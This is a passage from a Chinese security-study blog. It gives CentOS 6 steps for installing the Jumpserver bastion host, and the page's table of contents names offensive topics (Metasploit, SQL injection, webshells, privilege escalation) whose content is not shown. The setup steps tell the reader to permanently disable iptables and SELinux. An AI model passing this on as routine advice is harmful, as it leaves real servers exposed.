<h2 id="跳板机"><a href="#跳板机" class="headerlink" title="跳板机"></a>跳板机</h2><p>作用：1.进行操作系统权限集中管理，可以对所有服务器中用户的权限进行分配，而不需要每台进行分配。<br>2.网络安全访问控制限制<br>3.记录管理人员的操作行为<br>安装之前环境准备:<br>a.下载软件优化：centos6执行wget -O /etc/yum.repos.d/CentOS-Base.repo <a href="https://mirrors.aliyun.com/repo/Centos-6.repo和wget" target="_blank" rel="noopener">https://mirrors.aliyun.com/repo/Centos-6.repo和wget</a> -O /etc/yum.repos.d/epel.repo <a href="http://mirrors.aliyun.com/repo/epel-6.repo两个命令进行优化" target="_blank" rel="noopener">http://mirrors.aliyun.com/repo/epel-6.repo两个命令进行优化</a><br>b.网络安全优化：<br>aa）关闭防火墙，执行 /etc/init.d/iptables stop 判断是否关闭/etc/init.d/iptables status，这种方式重启后仍然开启，永久关闭方法chkconfig iptables off<br>bb）关闭selinux，它的作用是限制root用户<br>执行setenforce 0，永久关闭方法：vim /etc/selinux/config 打开配置文件将SELINUX改为disable<br>c.开始安装依赖软件：yum -y install git python-pip mysql-devel gcc automake autoconf python-devel vim sshpass lrzsz readline-devel<br>安装跳板机：cd /opt 进入该目录执行，git clone <a href="https://git.coding.net/jumpserver/jumpserver.git" target="_blank" rel="noopener">https://git.coding.net/jumpserver/jumpserver.git</a><br>d.排错：以下都是在opt/install文件夹下进行 1）优化python排错下载；mkdir ~/.pip ,vim ~/.pip/pip.conf,在该文件中添加<br>[global]<br>index-url = <a href="https://mirrors.aliyun.com/pypi/simple/" target="_blank" rel="noopener">https://mirrors.aliyun.com/pypi/simple/</a><br>[install]<br>trusted-host=mirrors.aliyun.com<br>2）卸载不兼容的软件：</p>
<pre><code>&gt; pip uninstall pycrypto 
&gt; rm -rf /usr/lib64/python2.6/site-packages/Crypto/
&gt; rm -rf  /usr/lib64/python2.6/site-packages/pycrypto-2.6.1-py2.6-linux-x86_64.egg（大部分不执行这条就能解决）
&gt; pip install pycrypto==2.4.1</code></pre><p>e。开始安装：pip install -r requirements.txt安装完之后执行，python install.py</p>
</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">我是良民</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/source/2020/04/06/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">http://yoursite.com/2020/04/06/网络安全学习/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="http://yoursite.com">我是良民的博客</a>！</span></div></blockquote></div></article><div class="p-info box"></div><aside id="toc"><div class="toc-title">目录</div><nav><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF学习"><span class="toc-number">1.</span> <span class="toc-text">MSF学习</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#环境"><span class="toc-number">1.1.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF介绍"><span class="toc-number">1.2.</span> <span class="toc-text">MSF介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF术语"><span class="toc-number">1.3.</span> <span class="toc-text">MSF术语</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF中模块（module）介绍"><span class="toc-number">1.4.</span> <span class="toc-text">MSF中模块（module）介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF中的常见命令"><span class="toc-number">1.5.</span> <span class="toc-text">MSF中的常见命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF渗透测试一"><span class="toc-number">1.6.</span> <span class="toc-text">MSF渗透测试一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF渗透测试二"><span class="toc-number">1.7.</span> <span class="toc-text">MSF渗透测试二</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF渗透测试三"><span class="toc-number">1.8.</span> <span class="toc-text">MSF渗透测试三</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#渗透测试四"><span class="toc-number">1.9.</span> <span class="toc-text">渗透测试四</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#渗透测试五"><span class="toc-number">1.10.</span> <span class="toc-text">渗透测试五</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#另一种linux漏洞"><span class="toc-number">1.11.</span> <span class="toc-text">另一种linux漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#破壳漏洞"><span class="toc-number">1.12.</span> <span class="toc-text">破壳漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-CGI漏洞"><span class="toc-number">1.13.</span> <span class="toc-text">PHP CGI漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-RMI-SERVER漏洞"><span class="toc-number">1.14.</span> <span class="toc-text">Java RMI SERVER漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#java-cve-2013-0422漏洞"><span class="toc-number">1.15.</span> <span class="toc-text">java cve-2013-0422漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#distcc后门漏洞"><span class="toc-number">1.16.</span> <span class="toc-text">distcc后门漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#druby命令执行漏洞"><span class="toc-number">1.17.</span> <span class="toc-text">druby命令执行漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#震网三代"><span class="toc-number">1.18.</span> <span class="toc-text">震网三代</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flash-0day病毒"><span class="toc-number">1.19.</span> <span class="toc-text">flash 0day病毒</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF辅助模块"><span class="toc-number">1.20.</span> <span class="toc-text">MSF辅助模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#拿到meterpreter-shell之后，后期攻击方法"><span class="toc-number">1.21.</span> <span class="toc-text">拿到meterpreter shell之后，后期攻击方法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#信息搜集"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#步骤1-首先进行漏洞扫描，"><span class="toc-number">2.0.1.</span> <span class="toc-text">步骤1.首先进行漏洞扫描，</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-子域名探测。"><span class="toc-number">2.0.2.</span> <span class="toc-text">2.子域名探测。</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#google-hack使用语法"><span class="toc-number">2.0.3.</span> <span class="toc-text">google hack使用语法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nmap"><span class="toc-number">2.0.4.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-敏感信息搜集"><span class="toc-number">2.0.5.</span> <span class="toc-text">3.敏感信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（1）web源码泄露"><span class="toc-number">2.0.6.</span> <span class="toc-text">（1）web源码泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-邮箱信息搜集"><span class="toc-number">2.0.7.</span> <span class="toc-text">(2) 邮箱信息搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（3）历史漏洞搜集"><span class="toc-number">2.0.8.</span> <span class="toc-text">（3）历史漏洞搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#（4）信息工具搜集"><span class="toc-number">2.0.9.</span> <span class="toc-text">（4）信息工具搜集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-指纹识别，waf，cdn识别"><span class="toc-number">2.0.10.</span> <span class="toc-text">4.指纹识别，waf，cdn识别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-资产管理"><span class="toc-number">2.0.11.</span> <span class="toc-text">5.资产管理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞扫描"><span class="toc-number">3.</span> <span class="toc-text">漏洞扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL注入"><span class="toc-number">4.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#union注入"><span class="toc-number">4.1.</span> <span class="toc-text">union注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#information-schema注入"><span class="toc-number">4.2.</span> <span class="toc-text">information_schema注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#基于函数报错注入"><span class="toc-number">4.3.</span> <span class="toc-text">基于函数报错注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#insert注入"><span class="toc-number">4.4.</span> <span class="toc-text">insert注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#update注入"><span class="toc-number">4.5.</span> <span class="toc-text">update注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete注入"><span class="toc-number">4.6.</span> <span class="toc-text">delete注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-header注入"><span class="toc-number">4.7.</span> <span class="toc-text">http header注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie注入"><span class="toc-number">4.8.</span> <span class="toc-text">cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#盲注"><span class="toc-number">4.9.</span> <span class="toc-text">盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二阶sql注入"><span class="toc-number">4.10.</span> <span class="toc-text">二阶sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ms-sql注入拿webshell实战"><span class="toc-number">4.11.</span> <span class="toc-text">ms sql注入拿webshell实战</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Access数据库注入"><span class="toc-number">4.12.</span> <span class="toc-text">Access数据库注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cookie注入-1"><span class="toc-number">4.13.</span> <span class="toc-text">cookie注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MsSQL注入"><span class="toc-number">4.14.</span> <span class="toc-text">MsSQL注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap"><span class="toc-number">5.</span> <span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS漏洞"><span class="toc-number">6.</span> <span class="toc-text">XSS漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件漏洞"><span class="toc-number">7.</span> <span class="toc-text">文件漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#任意文件下载漏洞"><span class="toc-number">7.1.</span> <span class="toc-text">任意文件下载漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件上传漏洞"><span class="toc-number">7.2.</span> <span class="toc-text">文件上传漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#文件包含漏洞"><span class="toc-number">7.3.</span> <span class="toc-text">文件包含漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#包含日志文件"><span class="toc-number">7.4.</span> <span class="toc-text">包含日志文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php包含读文件"><span class="toc-number">7.5.</span> <span class="toc-text">php包含读文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php包含写文件"><span class="toc-number">7.6.</span> <span class="toc-text">php包含写文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">8.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#实验"><span class="toc-number">8.1.</span> <span class="toc-text">实验</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF"><span class="toc-number">9.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE漏洞"><span class="toc-number">10.</span> <span class="toc-text">XXE漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#远程命令执行与反序列化"><span class="toc-number">11.</span> <span class="toc-text">远程命令执行与反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eval注入攻击"><span class="toc-number">11.1.</span> <span class="toc-text">eval注入攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP木马后门常用命令"><span class="toc-number">11.2.</span> <span class="toc-text">PHP木马后门常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#禁止webshell执行命令"><span class="toc-number">11.3.</span> <span class="toc-text">禁止webshell执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2框架漏洞"><span class="toc-number">11.4.</span> <span class="toc-text">Struts2框架漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#反序列化漏洞"><span class="toc-number">11.5.</span> <span class="toc-text">反序列化漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#暴力破解"><span class="toc-number">12.</span> <span class="toc-text">暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#验证码绕过"><span class="toc-number">12.1.</span> <span class="toc-text">验证码绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编辑器漏洞"><span class="toc-number">13.</span> <span class="toc-text">编辑器漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#旁注"><span class="toc-number">14.</span> <span class="toc-text">旁注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#跨库查询"><span class="toc-number">14.1.</span> <span class="toc-text">跨库查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CDN"><span class="toc-number">14.2.</span> <span class="toc-text">CDN</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#越权漏洞"><span class="toc-number">15.</span> <span class="toc-text">越权漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#逻辑漏洞"><span class="toc-number">16.</span> <span class="toc-text">逻辑漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#社会工程学"><span class="toc-number">17.</span> <span class="toc-text">社会工程学</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#邮件安全三大协议"><span class="toc-number">17.1.</span> <span class="toc-text">邮件安全三大协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#邮件伪造"><span class="toc-number">17.2.</span> <span class="toc-text">邮件伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#钓鱼网站"><span class="toc-number">17.3.</span> <span class="toc-text">钓鱼网站:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#APT攻击"><span class="toc-number">18.</span> <span class="toc-text">APT攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他漏洞总结"><span class="toc-number">19.</span> <span class="toc-text">其他漏洞总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#渗透思路"><span class="toc-number">20.</span> <span class="toc-text">渗透思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#渗透测试报告"><span class="toc-number">21.</span> <span class="toc-text">渗透测试报告</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#源代码审计"><span class="toc-number">22.</span> <span class="toc-text">源代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF"><span class="toc-number">23.</span> <span class="toc-text">WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#waf身份验证绕过"><span class="toc-number">23.1.</span> <span class="toc-text">waf身份验证绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#waf数据包解析的绕过"><span class="toc-number">23.2.</span> <span class="toc-text">waf数据包解析的绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#waf文件上传漏洞"><span class="toc-number">23.3.</span> <span class="toc-text">waf文件上传漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Waf木马检测绕过"><span class="toc-number">23.4.</span> <span class="toc-text">Waf木马检测绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一句话木马编写"><span class="toc-number">23.5.</span> <span class="toc-text">一句话木马编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用waf创建账号"><span class="toc-number">23.6.</span> <span class="toc-text">使用waf创建账号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#webshell"><span class="toc-number">24.</span> <span class="toc-text">webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#常见提权方法"><span class="toc-number">25.</span> <span class="toc-text">常见提权方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#UDF提权"><span class="toc-number">25.1.</span> <span class="toc-text">UDF提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#公网到内网攻击"><span class="toc-number">25.2.</span> <span class="toc-text">公网到内网攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内网到内网攻击"><span class="toc-number">25.3.</span> <span class="toc-text">内网到内网攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三方提权"><span class="toc-number">26.</span> <span class="toc-text">第三方提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#server-u提权"><span class="toc-number">26.1.</span> <span class="toc-text">server-u提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FlashFXP提权"><span class="toc-number">26.2.</span> <span class="toc-text">FlashFXP提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gene6FTP提权"><span class="toc-number">26.3.</span> <span class="toc-text">gene6FTP提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#VNC提权"><span class="toc-number">26.4.</span> <span class="toc-text">VNC提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#radmin提权"><span class="toc-number">26.5.</span> <span class="toc-text">radmin提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zend提权"><span class="toc-number">26.6.</span> <span class="toc-text">zend提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DLL劫持"><span class="toc-number">26.7.</span> <span class="toc-text">DLL劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows空格，服务漏洞提权"><span class="toc-number">26.8.</span> <span class="toc-text">windows空格，服务漏洞提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#perl与cals提权"><span class="toc-number">26.9.</span> <span class="toc-text">perl与cals提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DoS攻击"><span class="toc-number">27.</span> <span class="toc-text">DoS攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Ip地址欺骗"><span class="toc-number">27.1.</span> <span class="toc-text">Ip地址欺骗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#smurf攻击"><span class="toc-number">27.2.</span> <span class="toc-text">smurf攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#socketStress攻击"><span class="toc-number">27.3.</span> <span class="toc-text">socketStress攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#跳板机"><span class="toc-number">28.</span> <span class="toc-text">跳板机</span></a></li></ol></nav></aside></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="prev" href="/source/2020/04/08/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">&lt; 安全基础学习</a></div><div id="valine-comment"><style type="text/css">.night .v[data-class=v] a { color: #0F9FB4 !important; }
.night .v[data-class=v] a:hover { color: #216C73 !important; }
.night .v[data-class=v] li { list-style: inherit; }
.night .v[data-class=v] .vwrap { border: 1px solid #223441; border-radius: 0; }
.night .v[data-class=v] .vwrap:hover { box-shadow: 0 0 6px 1px #223441; }
.night .v[data-class=v] .vbtn { border-radius: 0; background: none; }
.night .v[data-class=v] .vlist .vcard .vh { border-bottom-color: #293D4E; }
.night .v[data-class=v] .vwrap .vheader .vinput { border-bottom-color: #223441; }
.night .v[data-class=v] .vwrap .vheader .vinput:focus { border-bottom-color: #339EB4; }
.night .v[data-class=v] code, .night .v[data-class=v] pre,.night .v[data-class=v] .vlist .vcard .vhead .vsys { background: #203240 !important; }
.night .v[data-class=v] code, .night .v[data-class=v] pre { color: #F0F0F0; font-size: 95%; }
.v[data-class=v] .vcards .vcard .vh {border-bottom-color: #223441; }
.night .v[data-class=v] .vcards .vcard .vcontent.expand:before {background: linear-gradient(180deg,rgba(38,57,73,.4),rgba(38,57,73,.9));}
.night .v[data-class=v] .vcards .vcard .vcontent.expand:after {background: rgba(38,57,73,.9)}
</style><div id="vcomment"></div><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'',
  appKey:'',
  lang: 'zh-cn',
  placeholder:'ヾﾉ≧∀≦)o Come on, say something...',
  avatar:'identicon',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></section><footer><p>Copyright © 2016 - 2020 <a href="/source/." rel="nofollow">我是良民</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/source/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/source/js/search.js"></script><script type="text/javascript" src="/source/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
    search_path = 'search.xml';
}
var path = '/source/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/source/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>